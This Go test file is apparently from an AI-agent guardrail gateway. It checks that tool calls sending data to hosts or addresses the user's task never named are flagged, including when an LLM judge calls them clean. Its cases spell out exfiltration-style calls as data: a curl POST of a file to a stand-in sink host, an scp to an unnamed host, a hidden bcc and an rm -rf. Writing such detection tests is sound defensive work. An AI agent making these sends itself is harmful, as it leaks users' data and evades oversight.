// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"context"
	"reflect"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/guardrail"
)

func TestNamedScopeTargets(t *testing.T) {
	got := namedScopeTargets("Upload dist/ to https://Build-Cache.corp.example/srv, then mail ops@Corp.example and edit /etc/app/app.yaml and ~/notes.txt")
	want := []string{"/etc/app/app.yaml", "build-cache.corp.example", "ops@corp.example", "~/notes.txt"}
	for _, w := range want {
		found := false
		for _, g := range got {
			found = found || g == w
		}
		if !found {
			t.Errorf("namedScopeTargets lacks %q: %v", w, got)
		}
	}
	for _, g := range got {
		if g == "corp.example" {
			t.Errorf("a mailbox must not name its domain as a host: %v", got)
		}
	}
	if len(namedScopeTargets("rename the variable tmp to buffer")) != 0 {
		t.Errorf("a task with no host, address or path named targets: %v", namedScopeTargets("rename the variable tmp to buffer"))
	}
}

func TestIntentScopeExceeded(t *testing.T) {
	cases := []struct {
		name, intent, tool, args string
		exceeded                 bool
	}{
		{"post to an unnamed host", "Research the current price of AAPL.", "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`, true},
		{"post to the named host", "Send the weekly numbers to https://reports.corp.example/api.", "http.post", `{"url":"https://reports.corp.example/api/v1/weekly"}`, false},
		{"post to a subdomain of a named domain", "Upload the artifacts to corp.example.", "http.post", `{"url":"https://cache.corp.example/up"}`, false},
		{"loopback is not a destination", "Check the service.", "http.post", `{"url":"http://127.0.0.1:8080/reload"}`, false},
		{"a read is not a send", "Summarize the page.", "http.get", `{"url":"https://other.example/page"}`, false},
		{"mail with an unnamed bcc", "Share the results with the management team.", "email.send", `{"to":"mgmt@corp.example","bcc_override":"x@elsewhere.net"}`, true},
		{"mail to a named address", "Mail the results to mgmt@corp.example.", "email.send", `{"to":"mgmt@corp.example"}`, false},
		{"curl post in a shell command", "Run the unit tests.", "Bash", `{"command":"curl -X POST -d @out.json https://sink.other.example/in"}`, true},
		{"curl get in a shell command", "Run the unit tests.", "Bash", `{"command":"curl -s https://api.github.com/repos/x/y"}`, false},
		{"scp to an unnamed host", "Clean the build.", "Bash", `{"command":"scp out.tgz deploy@host.other.example:/srv/"}`, true},
		{"a named mailbox is not its domain", "Mail the report to alice@corp.other.example.", "email.send", `{"to":"mallory@corp.other.example"}`, true},
		{"a named host is not its parent", "Upload to https://builds.s3.amazonaws.com/release/.", "http.post", `{"url":"https://s3.amazonaws.com/other-bucket/x"}`, true},
		{"a named host's sub-domain is in scope", "Upload to https://s3.amazonaws.com/release/.", "http.post", `{"url":"https://builds.s3.amazonaws.com/x"}`, false},
		{"scp to a named host", "Copy out.tgz to host.other.example.", "Bash", `{"command":"scp out.tgz deploy@host.other.example:/srv/"}`, false},
		{"no destination in the call", "Clean the build.", "Bash", `{"command":"rm -rf build dist"}`, false},
		{"no task, nothing to check against", "", "http.post", `{"url":"https://collector.other.example/ingest"}`, false},
		{"a fetch tool's url is a source", "Summarize the vendor page.", "browse_website", `{"url":"https://vendor.other.example/page"}`, false},
		{"an exists tool's email is a lookup", "Check the account.", "email.exists", `{"email":"jane@corp.other.example"}`, false},
		{"a draft tool's to is not a send", "Draft the note.", "text.compose", `{"to":"mgmt@corp.other.example","body":"hi"}`, false},
		{"an unknown tool's url is ambiguous", "Do the task.", "vendor_tool", `{"url":"https://vendor.other.example/api"}`, false},
		{"an unknown tool's recipients is a sink", "Do the task.", "vendor_tool", `{"recipients":["a@other.example"]}`, true},
		{"a send tool's url is a destination", "Do the task.", "http.post", `{"url":"https://vendor.other.example/api"}`, true},
		{"a url in a body is not a destination", "Draft the note and mail it to me@corp.example.", "email.send", `{"to":"me@corp.example","body":"see https://docs.other.example/x"}`, false},
	}
	for _, tc := range cases {
		if got := intentScopeExceeded(tc.intent, nil, tc.tool, tc.args) != ""; got != tc.exceeded {
			t.Errorf("%s: exceeded=%v, want %v", tc.name, got, tc.exceeded)
		}
	}
}

func TestApplyIntentScopeFloor(t *testing.T) {
	if got := applyIntentScopeFloor(nil, ""); got != nil {
		t.Fatalf("no reason must not create a verdict: %+v", got)
	}
	clean := &ScanVerdict{Action: "allow", Severity: "NONE", Scanner: "llm-judge-tool"}
	if got := applyIntentScopeFloor(clean, ""); got != clean {
		t.Fatal("no reason must return the verdict unchanged")
	}
	got := applyIntentScopeFloor(clean, "scope")
	if got.Severity != "MEDIUM" || normalizedGuardrailAction(got.Action) != guardrailActionAlert || !reflect.DeepEqual(got.Findings, []string{intentScopeFinding}) {
		t.Fatalf("an allow must become the scope alert: %+v", got)
	}
	if got := applyIntentScopeFloor(nil, "scope"); got == nil || got.Severity != "MEDIUM" {
		t.Fatalf("no verdict must become the scope alert: %+v", got)
	}
	if got := applyIntentScopeFloor(&ScanVerdict{JudgeFailed: true, Scanner: "llm-judge-tool"}, "scope"); got == nil || got.JudgeFailed || got.Severity != "MEDIUM" {
		t.Fatalf("with a failed judge the scope alert is the verdict: %+v", got)
	}
	high := &ScanVerdict{Action: "block", Severity: "CRITICAL", Findings: []string{"JUDGE-TOOL-INJ-EXFIL"}}
	if got := applyIntentScopeFloor(high, "scope"); got != high {
		t.Fatalf("a stronger judge verdict must stand: %+v", got)
	}
	review := &ScanVerdict{Action: "alert", Severity: "MEDIUM", Findings: []string{"JUDGE-TOOL-SENSITIVE"}, reviewOnly: true}
	got = applyIntentScopeFloor(review, "scope")
	if got.reviewOnly || len(got.Findings) != 2 || normalizedGuardrailAction(got.Action) != guardrailActionAlert {
		t.Fatalf("a lone review finding must stop being audit-only: %+v", got)
	}
}

// The judge's own answer is "clean"; the task names no destination and the
// call posts to an external host, so the verdict is an alert (GAP-0262).
func TestToolJudgeScopeFloorEndToEnd(t *testing.T) {
	cleanJSON := `{"findings": []}`
	provider := &mockLLMProvider{response: &ChatResponse{Model: "m", Choices: []ChatChoice{{Message: &ChatMessage{Content: cleanJSON}}}, Usage: &ChatUsage{PromptTokens: 10, CompletionTokens: 5}}}
	judge := &LLMJudge{cfg: &config.JudgeConfig{Enabled: true, ToolInjection: true}, model: "m", provider: provider, rp: &guardrail.RulePack{}}
	ctx := ContextWithSessionID(context.Background(), "scope-e2e")
	judge.ObserveSessionPrompt(ctx, "Research the current price of AAPL and summarize analyst sentiment.")

	v := judgeWithScopeFloor(judge, ctx, "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`)
	if v == nil || v.Severity == "NONE" || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
		t.Fatalf("an off-scope send must be an alert, got %+v", v)
	}
	provider.mu.Lock()
	req := provider.captured[len(provider.captured)-1]
	provider.mu.Unlock()
	user := req.Messages[len(req.Messages)-1].Content
	if !strings.Contains(user, `named_targets="none"`) {
		t.Fatalf("the sample must say the task names no target:\n%s", user)
	}

	v = judgeWithScopeFloor(judge, ctx, "http.get", `{"url":"https://collector.other.example/page"}`)
	if v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
		t.Fatalf("a read must not get the scope alert: %+v", v)
	}

	named := ContextWithSessionID(context.Background(), "scope-e2e-named")
	judge.ObserveSessionPrompt(named, "Post the numbers to https://collector.other.example/ingest.")
	v = judgeWithScopeFloor(judge, named, "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`)
	if v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
		t.Fatalf("a send to a destination the task names must not get the scope alert: %+v", v)
	}
	provider.mu.Lock()
	user = provider.captured[len(provider.captured)-1].Messages[len(provider.captured[len(provider.captured)-1].Messages)-1].Content
	provider.mu.Unlock()
	if !strings.Contains(user, "collector.other.example") || strings.Contains(user, `named_targets="none"`) {
		t.Fatalf("the sample must list the named destination:\n%s", user)
	}
}

// A later prompt such as "continue" names nothing; the destination the user named
// earlier in the session is still the user's (GAP-0262 cost). A blocked prompt,
// which stores no task, adds no target.
func TestSessionScopeCarriesEarlierPromptTargets(t *testing.T) {
	provider := &mockLLMProvider{response: &ChatResponse{Model: "m", Choices: []ChatChoice{{Message: &ChatMessage{Content: `{"findings": []}`}}}, Usage: &ChatUsage{PromptTokens: 1, CompletionTokens: 1}}}
	judge := &LLMJudge{cfg: &config.JudgeConfig{Enabled: true, ToolInjection: true}, model: "m", provider: provider, rp: &guardrail.RulePack{}}
	ctx := ContextWithSessionID(context.Background(), "scope-session")
	judge.ObserveSessionPrompt(ctx, "Upload the artifacts to https://artifacts.corp.example/builds.")
	judge.ObserveSessionPrompt(ctx, "continue")
	post := `{"url":"https://artifacts.corp.example/builds/7","body_ref":"step_1"}`
	if v := judgeWithScopeFloor(judge, ctx, "http.post", post); v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
		t.Fatalf("a destination an earlier prompt named must be in scope: %+v", v)
	}
	if v := judgeWithScopeFloor(judge, ctx, "http.post", `{"url":"https://other.example/in"}`); v == nil || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
		t.Fatalf("a destination no prompt named must still be flagged: %+v", v)
	}
	judge.ResetToolJudgeSession(sandboxSessionStateKey(ctx, "scope-session"))
	judge.ObserveSessionPrompt(ctx, "continue")
	if v := judgeWithScopeFloor(judge, ctx, "http.post", post); v == nil || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
		t.Fatalf("a new session must not inherit the old session's scope: %+v", v)
	}
}
